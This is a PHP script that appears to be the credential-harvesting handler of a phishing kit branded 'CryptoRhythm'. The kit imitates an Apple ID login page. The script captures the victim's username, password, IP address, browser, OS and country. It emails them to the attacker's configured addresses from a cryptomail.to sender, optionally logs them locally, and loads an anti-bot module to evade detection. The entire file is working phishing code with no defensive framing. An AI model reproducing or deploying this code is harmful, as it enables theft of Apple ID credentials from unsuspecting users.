<?php

header("Content-type: application/json");

session_start();

define("INC", "true");

require_once("../inc/config.inc.php");
require_once("../inc/crypto.inc.php");
require_once("../inc/countries.php");
require_once("../system/system.inc.php");
require_once("../inc/encryption.inc.php");
require_once("../inc/cryptodb.inc.php");
require_once("../track/module.php");
require_once("../antibots.php");



if(isset($_GET['username']) && isset($_GET['password']) && $_GET['username'] != "" && $_GET['password'] != "") {
  $_SESSION['username'] = htmlentities($_GET['username']);
  $_SESSION['password'] = htmlentities($_GET['password']);
  $crypto = new Crypto($template);

  $template = $crypto->loadTemplate("login");
  $user_agent = $_SERVER['HTTP_USER_AGENT'];

  $browser = $crypto->getInfo("browser", $user_agent);
  $os = $crypto->getInfo("os", $user_agent);

  $template = str_replace("[CRYPTORESULT]", "Apple ID Login", $template);
  $template = str_replace("[CRYPTOUSERNAME]", $_GET['username'], $template);
  $template = str_replace("[CRYPTOPASSWORD]", $_GET['password'], $template);
  $template = str_replace("[CRYPTOIP]", $_SESSION['_ip_'], $template);
  $template = str_replace("[CRYPTOOS]", $os, $template);
  $template = str_replace("[CRYPTOBROWSER]", $browser, $template);
  $template = str_replace("[CRYPTOCOUNTRY]", $code_country[$_SESSION['country_code']], $template);
  $template = str_replace("[CRYPTOVERSION]", $version, $template);

  $headers = "MIME-Version: 1.0" . "\r\n";
  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
  $headers .= 'From: <cryptorhythm@cryptomail.to>' . "\r\n";

  $subject = "CryptoRhythm - New Apple ID login from ".$code_country[$_SESSION['country_code']];
  foreach(explode(",", $receiver) as $rc) {
	mail($rc, $subject, $template, $headers);
  }
  

  if($local_log) {
    savelogin($_GET['username'], $_GET['password'], $password);
  }

  $_SESSION['_step_'] = "2";
  echo '{"action":"done"}';
}
?>
